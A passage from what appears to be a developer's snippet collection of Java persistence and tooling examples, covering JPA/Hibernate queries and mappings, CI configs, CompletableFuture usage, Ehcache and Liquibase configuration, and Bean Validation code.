                                     .getResultList();
      entityAList.forEach(System.out::println);
      em.close();
  }

  private static void runTypeInQuery(EntityManagerFactory emf) {
      System.out.println("-- running TYPE with 'IN' query --");
      EntityManager em = emf.createEntityManager();
      List<Employee> entityAList =
              em.createQuery("SELECT t FROM Employee t WHERE TYPE(t) IN (ContractEmployee, PartTimeEmployee)")
                .getResultList();
      entityAList.forEach(System.out::println);
      em.close();
  }

  private static void runTypeNotInQuery(EntityManagerFactory emf) {
      System.out.println("-- running TYPE NOT 'IN' query --");
      EntityManager em = emf.createEntityManager();
      List<Employee> entityAList =
              em.createQuery("SELECT t FROM Employee t WHERE TYPE(t) NOT IN (ContractEmployee, PartTimeEmployee)")
                .getResultList();
      entityAList.forEach(System.out::println);
      em.close();
  }
-------------------------------------------------------------------------------------------------------
public final class HibernateExporter {

    private static final Logger LOG = LoggerFactory.getLogger(HibernateExporter.class);
    private static final String OUTPUT_FILE = "schema.sql";
    private static final String DIALECT = "org.hibernate.dialect.H2Dialect";

    private List<String> entityPackages;

    private HibernateExporter(List<String> entityPackages) {
        this.entityPackages = entityPackages;
    }

    public static void main(String[] args) {
        final List<String> entityPackages = Collections.singletonList("pakage.with.entites");

        HibernateExporter exporter = new HibernateExporter(entityPackages);
        exporter.export();
    }

    private void export() {
        SchemaExport export = new SchemaExport();
        export.setOutputFile(OUTPUT_FILE);
        export.setFormat(true);
        export.setDelimiter(";");
        EnumSet<TargetType> types = EnumSet.of(TargetType.SCRIPT);
        Metadata metadata = createMetadataSources().buildMetadata();
        export.execute(types, Action.CREATE, metadata);
    }

    private MetadataSources createMetadataSources() {
        MetadataSources metadata = new MetadataSources(
                new StandardServiceRegistryBuilder()
                        .applySetting("hibernate.dialect", DIALECT)
                        .build());

        for (String entityPackage : entityPackages) {
            final Reflections reflections = new Reflections(entityPackage);
            for (Class<?> cl : reflections.getTypesAnnotatedWith(MappedSuperclass.class)) {
                metadata.addAnnotatedClass(cl);
                LOG.info(String.format("Mapped = %s", cl.getName()));
            }
            for (Class<?> cl : reflections.getTypesAnnotatedWith(Entity.class)) {
                metadata.addAnnotatedClass(cl);
                LOG.info(String.format("Mapped = %s", cl.getName()));
            }
        }
        return metadata;
    }
}
-------------------------------------------------------------------------------------------------------
os: Visual Studio 2015

install:
  - ps: |
      Add-Type -AssemblyName System.IO.Compression.FileSystem
      if (!(Test-Path -Path "C:\maven" )) {
        (new-object System.Net.WebClient).DownloadFile(
          'http://www.us.apache.org/dist/maven/maven-3/3.3.9/binaries/apache-maven-3.3.9-bin.zip',
          'C:\maven-bin.zip'
        )
        [System.IO.Compression.ZipFile]::ExtractToDirectory("C:\maven-bin.zip", "C:\maven")
      }
  - cmd: SET PATH=C:\maven\apache-maven-3.3.9\bin;%JAVA_HOME%\bin;%PATH%
  - cmd: SET MAVEN_OPTS=-XX:MaxPermSize=2g -Xmx4g
  - cmd: SET JAVA_OPTS=-XX:MaxPermSize=2g -Xmx4g

build_script:
  - mvn install -DskipTests=true -Dmaven.javadoc.skip=true -B -V

test_script:
  - mvn test -B

cache:
  - C:\maven\
  - C:\Users\appveyor\.m2

notifications:
  - provider: Email
    to:
      - error-prone-team+ci@google.com
    on_build_success: false
    on_build_failure: true
    on_build_status_changed: true
-------------------------------------------------------------------------------------------------------
language: java


matrix:
  allow_failures:
    - jdk: oraclejdk9
  include:
# JDK 8
    - jdk: oraclejdk8
      env: JDK_RELEASE='8'
# JDK 9
    - jdk: oraclejdk9
      env: JDK_RELEASE='9'

# use travis-ci docker based infrastructure
sudo: false

cache:
  directories:
    - $HOME/.m2

notifications:
  #email: error-prone-team@google.com
  webhooks:
    urls:
      - https://webhooks.gitter.im/e/74d33a22fbfb1942920e
    on_success: change  # options: [always|never|change] default: always
    on_failure: always  # options: [always|never|change] default: always

# Store encrypted credentials for gh-pages and sonatype:
# travis encrypt -r google/error-prone GH_TOKEN=<github access token>
# travis encrypt -r google/error-prone CI_DEPLOY_USERNAME=<sonatype username>
# travis encrypt -r google/error-prone CI_DEPLOY_PASSWORD=<sonatype password>

env:
  global:
    - secure: "kM6uLpPkYz/i5FTMAh0yUyhLrmJFDr643u49i9FHreg+L5n+DYUilbRPOfHhN802Wd9Pb1yGkFxbumuzo+ZjTjHmyjH5w5hsRvRrPVX3FRnMN5SMCnE95nBZJOyMrYHYnko+IXsENqqfPjTe5d/fUsMcwYcIPuqssaO+lvTv0Yw="
    - secure: "VTl3ljwGf0KPbX5wW1+MgQuLwpfSppph/STiyUOQkISO5jDwBAfnvcBymn/oLESwQeLZ/D+GZtL/sooG2Kf6v8Fdn6Q6VhwfSxgLDJUME+A4rOBBnDExhpUz+OT0XugWHfQ/sYRaDRk1/c1axt3XB/cxlzPNIJKlzDoPZpfDyGM="
    - secure: "FHXaeHYXmdGNYZLuSbAE7c5xmIhUT8/VzpnlkVmDgCPXgOGY7RzCpF4MVPIDm7f63bx/qZSu+d008gFHTI98UQLHMACjD1wuahk+0vqXVG1W3WwruqilTriYjW1gUkwa5zv5AaApq0dd5CO7li1DpNPgqOrU50ddJlb0BZ6wv1Q="

after_success:
  - util/publish-snapshot-on-commit.sh
  - util/generate-latest-docs.sh
-------------------------------------------------------------------------------------------------------
#! /bin/sh
PREFIX="taskset -c 0 java -XX:+UnlockDiagnosticVMOptions -XX:-TieredCompilation -XX:+PrintCompilation -jar out/nearly-optimal-mergesort.jar "
SEED=248442268

echo Running study 1 - Random Permutations
$PREFIX 1001 10_000,100_000,1_000_000 $SEED rp        times-rp-small       > times-rp-small.out
$PREFIX 9001          10_000          $SEED rp        times-rp-10k         > times-rp-10k.out
$PREFIX  201      10_000_000          $SEED rp        times-rp-10m         > times-rp-10m.out
$PREFIX   21     100_000_000          $SEED rp        times-rp-100m        > times-rp-100m.out

echo Running study 2 - sqrt-n runs
$PREFIX  201      10_000_000          $SEED runs3000    times-runs3k-10m   > times-runs3k-10m.out

echo Running study 3 - timdrag input
$PREFIX  201      16_777_216          $SEED timdrag32   times-timdrag32-16m > times-timdrag32-16m.out

#! /bin/sh
# -XX:+UnlockDiagnosticVMOptions -XX:+PrintCompilation
# -XX:-TieredCompilation
# -verbose:gc
PREFIX="taskset -c 2 java -Xms1g -Xmx1g -jar out/nearly-optimal-mergesort.jar "
SEED=248442268

echo Running study 1 - Random Permutations
$PREFIX 200          1000,5000,10_000,50_000,100_000   $SEED rp        times-rp             > times-rp.out
#$PREFIX  201      10_000_000          $SEED rp        times-rp-10m         > times-rp-10m.out
#$PREFIX   21     100_000_000          $SEED rp        times-rp-100m        > times-rp-100m.out

#echo Running study 2 - iid runs
#$PREFIX  200     1000,5000,10_000,50_000,100_000          $SEED iid500    times-iid500      > times-iid500.out

echo Running study 3 - sqrt-n runs
$PREFIX  200     1000,5000,10_000,50_000,100_000          $SEED runs30    times-runs30         > times-runs30.out
#$PREFIX  201      10_000_000          $SEED runs3000    times-runs3k-10m   > times-runs3k-10m.out

echo Running study 4 - timdrag input
$PREFIX  200      1000,5000,10_000,50_000,100_000          $SEED timdrag32   times-timdrag32 > times-timdrag32.out


-------------------------------------------------------------------------------------------------------
@Converter
public class FileConverter implements AttributeConverter<File, String> {

  @Override
  public String convertToDatabaseColumn(File attribute) {
      return attribute.getAbsolutePath();
  }

  @Override
  public File convertToEntityAttribute(String dbData) {
      return new File(dbData);
  }
}
-------------------------------------------------------------------------------------------------------
<properties>
  <property name="javax.persistence.lock.timeout" value="600000"/>
  <property name="javax.persistence.schema-generation.database.action" value="create"/>
  <property name="javax.persistence.jdbc.url" value="jdbc:h2:mem:test;DB_CLOSE_DELAY=-1;LOCK_TIMEOUT=600000"/>
</properties>
-------------------------------------------------------------------------------------------------------
INSERT INTO tablename (fieldname1, fieldname2, fieldname3)
SELECT * FROM (
    SELECT UNNEST(ARRAY[1, 2, 3]), 
           UNNEST(ARRAY[100, 200, 300]), 
           UNNEST(ARRAY['a', 'b', 'c'])
) AS temptable
WHERE NOT EXISTS (
    SELECT 1 FROM tablename tt
    WHERE tt.fieldname1=temptable.fieldname1
);
-------------------------------------------------------------------------------------------------------
public interface UserRepository extends MongoRepository<User, String> {
 
    @Async(AsyncConfiguration.TASK_EXECUTOR_REPOSITORY)
    CompletableFuture<Page<User>> findAllBy(final Pageable pageable);
 
    @Async(AsyncConfiguration.TASK_EXECUTOR_REPOSITORY)
    CompletableFuture<User> findOneById(final String id);
}
-------------------------------------------------------------------------------------------------------
https://www.humansreadcode.com/spring-boot-completablefuture/
https://www.nurkiewicz.com/2013/05/java-8-definitive-guide-to.html
https://github.com/spring-projects/spring-data-examples/tree/master/jpa/java8/src/main/java/example/springdata/jpa/java8

interface CustomerRepository extends Repository<Customer, Long> {

  @Query("select c from Customer c")
  Stream<Customer> streamAllCustomers();
}

try (Stream<Customer> customers = repository.streamAllCustomers()) {
  // use the stream here
}
-------------------------------------------------------------------------------------------------------
    List<String> webPageLinks = Arrays.asList(...)	// A list of 100 web page links
    // Download contents of all the web pages asynchronously
    List<CompletableFuture<String>> pageContentFutures = webPageLinks.stream()
            .map(webPageLink -> downloadWebPage(webPageLink))
            .collect(Collectors.toList());
    // Create a combined Future using allOf()
    CompletableFuture<Void> allFutures = CompletableFuture.allOf(
            pageContentFutures.toArray(new CompletableFuture[pageContentFutures.size()])
    );

    CompletableFuture<String> future1 = CompletableFuture.supplyAsync(() -> {
        try {
            TimeUnit.SECONDS.sleep(2);
        } catch (InterruptedException e) {
           throw new IllegalStateException(e);
        }
        return "Result of Future 1";
    });
    CompletableFuture<String> future2 = CompletableFuture.supplyAsync(() -> {
        try {
            TimeUnit.SECONDS.sleep(1);
        } catch (InterruptedException e) {
           throw new IllegalStateException(e);
        }
        return "Result of Future 2";
    });
    CompletableFuture<String> future3 = CompletableFuture.supplyAsync(() -> {
        try {
            TimeUnit.SECONDS.sleep(3);
        } catch (InterruptedException e) {
           throw new IllegalStateException(e);
        }
        return "Result of Future 3";
    });
    CompletableFuture<Object> anyOfFuture = CompletableFuture.anyOf(future1, future2, future3);
    System.out.println(anyOfFuture.get()); // Result of Future 2

    // When all the Futures are completed, call `future.join()` to get their results and collect the results in a list -
    CompletableFuture<List<String>> allPageContentsFuture = allFutures.thenApply(v -> {
       return pageContentFutures.stream()
               .map(pageContentFuture -> pageContentFuture.join())
               .collect(Collectors.toList());
    });
-------------------------------------------------------------------------------------------------------
// Run a task specified by a Runnable Object asynchronously.
CompletableFuture<Void> future = CompletableFuture.runAsync(new Runnable() {
    @Override
    public void run() {
        // Simulate a long-running Job
        try {
            TimeUnit.SECONDS.sleep(1);
        } catch (InterruptedException e) {
            throw new IllegalStateException(e);
        }
        System.out.println("I'll run in a separate thread than the main thread.");
    }
});
// Block and wait for the future to complete
future.get(
-------------------------------------------------------------------------------------------------------
    CompletableFuture<String> welcomeText  = CompletableFuture.supplyAsync(() -> {
    	try {
    		TimeUnit.SECONDS.sleep(1);
    	} catch (InterruptedException e) {
    		throw new IllegalStateException(e);
    	}
    	System.out.println(Thread.currentThread().getName());
    	return "Rajeev";
    }).thenApply(name -> {
    	System.out.println(Thread.currentThread().getName());
    	return "Hello " + name;
    		
    }).thenApply(greeting -> {
    	System.out.println(Thread.currentThread().getName());
    	return greeting + ", Welcome to the CalliCoder Blog";
    });
    System.out.println(Thread.currentThread().getName()+" go further");
    		
    // Block and wait for the future to complete
    System.out.println(Thread.currentThread().getName()+" "+welcomeText .get());
-------------------------------------------------------------------------------------------------------
SELECT * FROM INFORMATION_SCHEMA.CONSTRAINTS WHERE TABLE_NAME='EMPLOYEE'
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='CONSTRAINTS'

  public static void main(String[] args) {
      EntityManagerFactory emf = Persistence.createEntityManagerFactory("example-unit");
      try {
          EntityManager em = emf.createEntityManager();
          nativeQuery(em, "SHOW TABLES");
          nativeQuery(em, "SHOW COLUMNS from Customer");
          nativeQuery(em, "SHOW COLUMNS from ITEM_QTY");

          emf.close();
      } finally {
          emf.close();
      }
  }
  
Entity
public class EntityA {
  @Id
  @GeneratedValue
  private int id;

  @Embedded
  @AttributeOverrides({
          @AttributeOverride(name = "myStr", column = @Column(name = "MY_STR_COL1"))
  })
  @AssociationOverrides({
          @AssociationOverride(
                  name = "entityBRef", joinColumns = @JoinColumn(name = "EntityAB_JOIN1"))
  })
  private ClassA classARef;

  @Embedded
  @AttributeOverrides({
          @AttributeOverride(name = "myStr", column = @Column(name = "MY_STR_COL2"))
  })
  @AssociationOverrides({
          @AssociationOverride(
                  name = "entityBRef", joinColumns = @JoinColumn(name = "EntityAB_JOIN2"))
  })
  private ClassA classARef2;
    .............
}


SELECT * FROM INFORMATION_SCHEMA.SEQUENCES
-------------------------------------------------------------------------------------------------------
  @Entity
    private static class HasEmbeddedIndex {
        @Id
        private ObjectId id;
        @Indexed
        private String name;
        @Embedded
        private EmbeddedIndex embeddedIndex;
    }

    @Embedded
    @Indexes(@Index(fields = @Field(value = "color", type = DESC)))
    private static class EmbeddedIndex {
        @Indexed
        private String name;
        private String color;
    }
-------------------------------------------------------------------------------------------------------
CREATE SEQUENCE public.hibernate_sequence INCREMENT 1 START 1 MINVALUE 1;
-------------------------------------------------------------------------------------------------------
public class EmbeddedFieldNamesSessionCustomizer implements SessionCustomizer {

@SuppressWarnings("rawtypes")
@Override
public void customize(Session session) throws Exception {
    Map<Class, ClassDescriptor> descriptors = session.getDescriptors();
    for (ClassDescriptor classDescriptor : descriptors.values()) {
        for (DatabaseMapping databaseMapping : classDescriptor.getMappings()) {
            if (databaseMapping.isAggregateObjectMapping()) {
                AggregateObjectMapping m = (AggregateObjectMapping) databaseMapping;
                Map<String, DatabaseField> mapping = m.getAggregateToSourceFields();

                ClassDescriptor refDesc = descriptors.get(m.getReferenceClass());
                for (DatabaseMapping refMapping : refDesc.getMappings()) {
                    if (refMapping.isDirectToFieldMapping()) {
                        DirectToFieldMapping refDirectMapping = (DirectToFieldMapping) refMapping;
                        String refFieldName = refDirectMapping.getField().getName();
                        if (!mapping.containsKey(refFieldName)) {
                            DatabaseField mappedField = refDirectMapping.getField().clone();
                            mappedField.setName(m.getAttributeName() + "_" + mappedField.getName());
                            mapping.put(refFieldName, mappedField);
                        }
                    }

                }
            }

        }
    }
}

}

@Entity 
public class Person {
  @AttributeOverrides({
    @AttributeOverride(name="street",column=@Column(name="homeStreet")),
    ...
  })
  @Embedded public Address home;

  @AttributeOverrides({
    @AttributeOverride(name="street",column=@Column(name="workStreet")),
    ...
  })
  @Embedded public Address work;
  }

  @Embeddable public class Address {
    @Basic public String street;
    ...
  }
}


@Entity
@Indexed
public class Address {
    @Id
    @GeneratedValue
    @DocumentId
    private Long id;

    @Field(index= Index.TOKENIZED)
    private String street;

    @IndexedEmbedded(depth = 1, prefix = "ownedBy_", targetElement = Owner.class)
    @Target(Owner.class)
    private Person ownedBy;


    ...
}

@Embeddable
public class Owner implements Person { ... }

https://docs.jboss.org/hibernate/search/3.3/reference/en-US/html/search-mapping.html#search-mapping-associated
=================================================================================
SELECT nextval('public.user_id_seq'); -- Returns 1
SELECT nextval('public.user_id_seq'); -- Returns 2
=================================================================================
@Id
@GeneratedValue(
    strategy= GenerationType.AUTO,
    generator="native"
)
@GenericGenerator(
    name = "native",
    strategy = "native"
)
private Long id;
=================================================================================
@Embeddable
public class IntegrationEJBPk implements Serializable {

    //...


    @ManyToOne(cascade = {}, fetch = FetchType.EAGER)
    @JoinColumn(name = "APPLICATION")
    public ApplicationEJB getApplication() {
        return application;
    }


    @Column(name = "ENTITY", unique = false, nullable = false, insertable = true, updatable = true)
    public String getEntity() {
        return entity;
    }

    @GeneratedValue(strategy = GenerationType.AUTO, generator = "INTEGRATION_ID_GEN")
    @SequenceGenerator(name = "INTEGRATION_ID_GEN", sequenceName = "OMP_INTEGRATION_CANONICAL_SEQ")
    @Column(name = "CANONICAL_ID", unique = false, nullable = false, insertable = true, updatable = true)
    public String getCanonicalId() {
        return canonicalId;
    }

    @Column(name = "NATIVE_ID", unique = false, nullable = false, insertable = true, updatable = true)
    public String getNativeId() {
        return nativeId;
    }

    @Column(name = "NATIVE_KEY", unique = false, nullable = false, insertable = true, updatable = true)
    public String getNativeKey() {
        return nativeKey;
    }

    //...
}

@Entity
@IdClass(ChildId.class)
public class ChildEntity {
   // The child table will have a composite PK:
   // (parent_ID, child_name)
       @Id 
       @ManyToOne
       int parentEntity;
=================================================================================
@GenericGenerator(name = "optimized-sequence", strategy = "enhanced-sequence", parameters = {
    @Parameter(name = "prefer_sequence_per_entity", value = "true"),
    @Parameter(name = "optimizer", value = "hilo"),
    @Parameter(name = "increment_size", value = "50") })
package org.example.myproject;

import org.hibernate.annotations.GenericGenerator;
import org.hibernate.annotations.Parameter;
=================================================================================
SELECT next_val as id_val
FROM hibernate_sequence FOR UPDATE
 
UPDATE hibernate_sequence
SET next_val= 2 where next_val=1
 
SELECT next_val as id_val
FROM hibernate_sequence FOR UPDATE
 
UPDATE hibernate_sequence
SET next_val= 3 where next_val=1
 
SELECT next_val as id_val
FROM hibernate_sequence FOR UPDATE
 
UPDATE hibernate_sequence
SET next_val= 4 where next_val=3
 
INSERT INTO post (title, id)
VALUES ('High-Performance Java Persistence, Part 1', 1)
 
INSERT INTO post (title, id)
VALUES ('High-Performance Java Persistence, Part 2', 2)
 
INSERT INTO post (title, id)
VALUES ('High-Performance Java Persistence, Part 3', 3)
=================================================================================
## Datasource
spring.datasource.url=jdbc:postgresql://localhost:5432/dirasat_api_db
spring.datasource.username=***
spring.datasource.password=***
## Hibernate Settings
# Hibernate DDL auto (create, create-drop, validate, update)
spring.jpa.database=postgresql
spring.jpa.database-platform=postgres
spring.jpa.hibernate.ddl-auto=create
spring.jpa.show-sql=true
spring.jooq.sql-dialect=postgres
## Flyway configuration
flyway.enabled=false
flyway.baseline-version=1
flyway.baseline-on-migrate=true
flyway.url=${spring.datasource.url}
flyway.user=${spring.datasource.username}
flyway.password=${spring.datasource.password}
flyway.schemas=public
flyway.locations=classpath:db/migrations
flyway.validate-on-migrate=true
=================================================================================
@Embedded
@AttributeOverrides({
  @AttributeOverride( name = "firstName", column = @Column(name = "contact_first_name")),
  @AttributeOverride( name = "lastName", column = @Column(name = "contact_last_name")),
  @AttributeOverride( name = "phone", column = @Column(name = "contact_phone"))
})
private ContactPerson contactPerson;

https://marcin-chwedczuk.github.io/introduction-to-hibernate-embeddable-types

@Entity
public class User {
  @Id
  @GeneratedValue(generator = "user_id_seq", strategy = GenerationType.SEQUENCE)
  @SequenceGenerator(
      name = "user_id_seq", 
      sequenceName = "user_id_seq", 
      allocationSize = 50
  )
  private Long id;
}

ALTER SEQUENCE public.user_id_seq INCREMENT 50;
-------------------------------------------------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8"?>
<ehcache:config
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:ehcache="http://www.ehcache.org/v3"
    xsi:schemaLocation="http://www.ehcache.org/v3 http://www.ehcache.org/schema/ehcache-core-3.0.xsd">

    <ehcache:persistence directory="${java.io.tmpdir}/.cache"></ehcache:persistence>

    <ehcache:thread-pools>
        <ehcache:thread-pool alias="defaultDiskPool" min-size="1" max-size="8"/>
        <ehcache:thread-pool alias="defaultWriteBehindPool" min-size="1" max-size="8"/>
        <ehcache:thread-pool alias="cache2Pool" min-size="2" max-size="5"/>
    </ehcache:thread-pools>

    <ehcache:event-dispatch thread-pool="defaultEventPool"/>
    <ehcache:write-behind thread-pool="defaultWriteBehindPool"/>
    <ehcache:disk-store thread-pool="defaultDiskPool"/>

    <ehcache:cache alias="default" uses-template="default-template">
        <ehcache:key-type>java.lang.String</ehcache:key-type>
        <ehcache:value-type>java.lang.String</ehcache:value-type>
    </ehcache:cache>

    <ehcache:cache alias="idempotent" uses-template="default-template">
        <ehcache:key-type>java.lang.String</ehcache:key-type>
        <ehcache:value-type>java.lang.Boolean</ehcache:value-type>

        <ehcache:expiry>
            <ehcache:none/>
        </ehcache:expiry>

        <ehcache:loader-writer>
            <ehcache:class>com.dinamexoft.carol.triggers.cache.DelegatedCacheLoaderWriter</ehcache:class>
            <ehcache:write-behind thread-pool="cache2Pool">
                <ehcache:batching batch-size="20">
                    <ehcache:max-write-delay>10</ehcache:max-write-delay>
                </ehcache:batching>
            </ehcache:write-behind>
        </ehcache:loader-writer>
    </ehcache:cache>

    <ehcache:cache alias="aggregate" uses-template="default-template">
        <ehcache:key-type>java.lang.String</ehcache:key-type>
        <ehcache:value-type>org.apache.camel.impl.DefaultExchangeHolder</ehcache:value-type>

        <ehcache:expiry>
            <ehcache:ttl>20</ehcache:ttl>
        </ehcache:expiry>
    </ehcache:cache>

    <ehcache:cache-template name="default-template">
        <ehcache:listeners dispatcher-thread-pool="cache2Pool">
            <ehcache:listener>
                <ehcache:class>com.dinamexoft.carol.triggers.cache.DelegatedCacheEventListener</ehcache:class>
                <ehcache:event-firing-mode>ASYNCHRONOUS</ehcache:event-firing-mode>
                <ehcache:event-ordering-mode>UNORDERED</ehcache:event-ordering-mode>
                <ehcache:events-to-fire-on>CREATED</ehcache:events-to-fire-on>
                <ehcache:events-to-fire-on>UPDATED</ehcache:events-to-fire-on>
                <ehcache:events-to-fire-on>EXPIRED</ehcache:events-to-fire-on>
                <ehcache:events-to-fire-on>REMOVED</ehcache:events-to-fire-on>
                <ehcache:events-to-fire-on>EVICTED</ehcache:events-to-fire-on>
            </ehcache:listener>
        </ehcache:listeners>

        <ehcache:resources>
            <ehcache:disk persistent="true" unit="MB">500</ehcache:disk>
            <ehcache:heap unit="MB">200</ehcache:heap>
            <ehcache:offheap unit="MB">260</ehcache:offheap>
        </ehcache:resources>

        <ehcache:disk-store-settings thread-pool="cache2Pool" writer-concurrency="4"/>
    </ehcache:cache-template>

</ehcache:config>

  cache:
    type: EHCACHE
    ehcache:
      config: classpath:ehcache-config.xml
-------------------------------------------------------------------------------------------------------
FullTextEntityManager fullTextEntityManager =
        org.hibernate.search.jpa.Search.getFullTextEntityManager(em);
QueryBuilder qb = fullTextEntityManager.getSearchFactory()
        .buildQueryBuilder().forEntity(AT.class).get();
org.apache.lucene.search.Query luceneQuery = qb.bool()
        .must(qb
                .range()
                .onField("dateType")
                .from(parseDate(startDate))
                .to(parseDate(endDate)).excludeLimit()
                .createQuery())
        .must(qb
        .keyword()
        .onField("arr")
        .matching(crsArrId).createQuery())
        .createQuery();
Sort sort = null;
if (order == OrderEnum.ASCENDING) {
    sort = new Sort(
            new SortField("dateType", SortField.Type.STRING));
} else {
    sort = new Sort(
            new SortField("dateType", SortField.Type.STRING, true));
}
FullTextQuery jpaQuery = fullTextEntityManager.createFullTextQuery(luceneQuery, AT.class);
jpaQuery.setSort(sort);
jpaQuery.setFirstResult(offset);
jpaQuery.setMaxResults(maxReturnedEvents);

return jpaQuery.getResultList();
-------------------------------------------------------------------------------------------------------
@Entity
public class A {

    @Id
    @SequenceGenerator(name = "C_SEQUENCE", sequenceName = "S_ARRM_01")
    @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "C_SEQUENCE")
    @Column(name = "IDE_ARR")
    private Long id;
}
-------------------------------------------------------------------------------------------------------
java -jar liquibase.jar --driver=org.h2.Driver --classpath=h2-1.3.170.jar --changeLogFile=yourchangelogpath/changelog.yaml --url=jdbc:h2:D:/Variaciok/db/variation --username=sa --password= updateSQL
java -jar liquibase.jar --defaultsFile=our_database.properties updateSQL
- changeSet:
  id: 1.0/7
  author: stivlo
  changes:
    - sql:
        sql: insert into my_table (id, name) values (1, "One")
    - sql:
        sql: insert into my_table (id, name) values (2, "Two")
		
- changeSet:
    id: 1.0/7
    author: stivlo
    comment: "Some comments go here"
    changes:
     - insert:
         tableName: my_table
         columns:
         - column:
             name: id
             value: "1"
         - column:
             name: name
             value: "One"
     - insert:
         tableName: my_table
         columns:
         - column:
             name: id
             value: "2"
         - column:
             name: name
             value: "Two"
-------------------------------------------------------------------------------------------------------
changeSet:
  id: insert-example
  author: liquibase-docs
  changes:
  - insert:
      catalogName: cat
      columns:
      - column:
          name: address
          type: varchar(255)
      dbms: h2, oracle
      schemaName: public
      tableName: person
-------------------------------------------------------------------------------------------------------
@Embeddable
public class Report {
  private String description;
  //@Convert(converter = FileConverter.class)
  private File file;
    .............
}

@Entity
public class Journal {
  @Id
  @GeneratedValue
  private long id;
  @ElementCollection
  @Convert(converter = FileConverter.class, attributeName = "file")
  private List<Report> reports;
    .............
}
-------------------------------------------------------------------------------------------------------
DROP TABLE PERSON;
DROP SEQUENCE SQ_PERSON;
CREATE TABLE PERSON(
 ID NUMBER(19),
 FIRST_NAME VARCHAR(255),
 LAST_NAME VARCHAR(255),
 ADDRESS VARCHAR(255),
 PRIMARY KEY (ID)
);

CREATE SEQUENCE SQ_PERSON MINVALUE 1 START WITH 1 INCREMENT BY 1 CACHE 10;

INSERT INTO PERSON VALUES (SQ_PERSON.nextval,'Rose','Kantata', '2736 Kooter Lane');
INSERT INTO PERSON VALUES (SQ_PERSON.nextval,'Mike','Togglie', '111 Cool Dr');
INSERT INTO PERSON VALUES (SQ_PERSON.nextval,'Dana', 'Whitley', '464 Gorsuch Drive');
INSERT INTO PERSON VALUES (SQ_PERSON.nextval,'Robin', 'Cash', '64 Zella Park');
INSERT INTO PERSON VALUES (SQ_PERSON.nextval,'Chary', 'Mess', '112 Yellow Hill');
-------------------------------------------------------------------------------------------------------
javax.validation.constraints.DecimalMax.message  = must be less than ${inclusive == true ? 'or equal to ' : ''}{value}
javax.validation.constraints.DecimalMin.message  = must be greater than ${inclusive == true ? 'or equal to ' : ''}{value}
javax.validation.constraints.Digits.message      = numeric value out of bounds (<{integer} digits>.<{fraction} digits> expected)
javax.validation.constraints.Max.message         = must be less than or equal to {value}
javax.validation.constraints.Min.message         = must be greater than or equal to {value}
javax.validation.constraints.Pattern.message     = must match "{regexp}"
javax.validation.constraints.Size.message        = size must be between {min} and {max}
-------------------------------------------------------------------------------------------------------
     public class Task {
        public void run (@Size(min = 3, max = 20) String name,
                         @NotNull Runnable runnable) {
            System.out.println("starting task synchronously: " + name);
            runnable.run();
        }
    }
	
    Task task = new Task();
    String taskName = "a"; //"myTask"
    Runnable runnable = null; // ()-> System.out.println("task running");

    ExecutableValidator executableValidator = validator.forExecutables();
    Set<ConstraintViolation<Task>> violations =
                      executableValidator.validateParameters(task,
                           Task.class.getDeclaredMethod("run",
                           new Class[]{String.class, Runnable.class}),
                           new Object[]{taskName, runnable});

    if (violations.size() > 0) {
          violations.stream().forEach(MethodParamValidationExample::printError);
    } else {
           task.run(taskName, runnable);
    }
-------------------------------------------------------------------------------------------------------
 LocalDate startDate = LocalDate.now();
  LocalDate endDate = LocalDate.now().minusDays(5);

  TradeHistory tradeHistory = new TradeHistory(startDate, endDate);

  Constructor<TradeHistory> constructor = TradeHistory.class.getConstructor(LocalDate
                            .class, LocalDate.class);

  ExecutableValidator executableValidator = validator.forExecutables();
  Set<ConstraintViolation<TradeHistory>> constraintViolations =
                     executableValidator.validateConstructorParameters(constructor,
                                                   new Object[]{startDate, endDate});

  if (constraintViolations.size() > 0) {
         constraintViolations.stream().forEach(
                               CrossParameterConstructorExample::printError);
  } else {
            //proceed using order
            System.out.println(tradeHistory);
  }   
-------------------------------------------------------------------------------------------------------
   public interface AppErrorHandler<T> extends Payload {
        void onError (ConstraintViolation<T> violation);
    }
-------------------------------------------------------------------------------------------------------
  public  class TestBean {
     @NotNull(payload = {ErrorEmailSender.class})
     private String str;

     //getters and setters

    }
	
	
  TestBean bean = new TestBean();
  Set<ConstraintViolation<TestBean>> constraintViolations =
                                                validator.validate(bean);

  if (constraintViolations.size() > 0) {
          constraintViolations.stream().forEach(
                                ConstraintPayloadExample2::processError);
  } else {
          //proceed using user object
            System.out.println(bean);
        }
  }


  private static void processError (ConstraintViolation<TestBean> violation) {
        Set<Class<? extends Payload>> payload =
                                   violation.getConstraintDescriptor().getPayload();

        payload.forEach(p -> {
            if (AppErrorHandler.class.isAssignableFrom(p)) {
                try {
                    AppErrorHandler errorHandler = (AppErrorHandler) p.newInstance();
                    errorHandler.onError(violation);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
  }
-------------------------------------------------------------------------------------------------------
  public class Severity {
        public static class Info implements Payload {}

        public static class Error implements Payload {}
    }
	
    public class TestBean {
      @NotNull(payload = {Severity.Error.class})
      @Size(min = 1, payload = {Severity.Info.class})
      private String str;

       public String getStr () {
            return str;
       }

       public void setStr (String str) {
            this.str = str;
       }
    }
	
        TestBean bean = new TestBean();
        //uncommenting next line will give us info severity
        // or setting a non-empty string won't give any validation error
        //bean.setStr("");

        Set<ConstraintViolation<TestBean>> constraintViolations =
                            validator.validate(bean);

        boolean severeError = false;

        if (constraintViolations.size() > 0) {
            for (ConstraintViolation<TestBean> violation : constraintViolations) {
                Set<Class<? extends Payload>> payloads =
                                    violation.getConstraintDescriptor().getPayload();
                for (Class<? extends Payload> payload : payloads) {
                    if (payload == Severity.Error.class) {
                        severeError = true;
                        System.out.println("Error: " + violation.getPropertyPath() + " " +
                                            violation.getMessage());
                    } else if (payload == Severity.Info.class) {
                        System.out.println("Info: " + violation.getPropertyPath() + " " +
                                            violation.getMessage());
                    }
                }
            }
        }

        if (!severeError) {
            //continue working with bean
            System.out.println("working with : " + bean);
        }
    }
-------------------------------------------------------------------------------------------------------
@Pattern(regexp = "\\d{3}-\\d{3}-\\d{4}")

  public static void main(String[] args) throws ParseException {
      Driver driver = new Driver(null, 60,
              new Date(System.currentTimeMillis() + 100000));
      DriverLicense dl = new DriverLicense(driver, 3454343);

      Validator validator = createValidator();
      Set<ConstraintViolation<DriverLicense>> violations =
              validator.validate(dl, LicenceNumberCheck.class, Default.class);
      if (violations.size() == 0) {
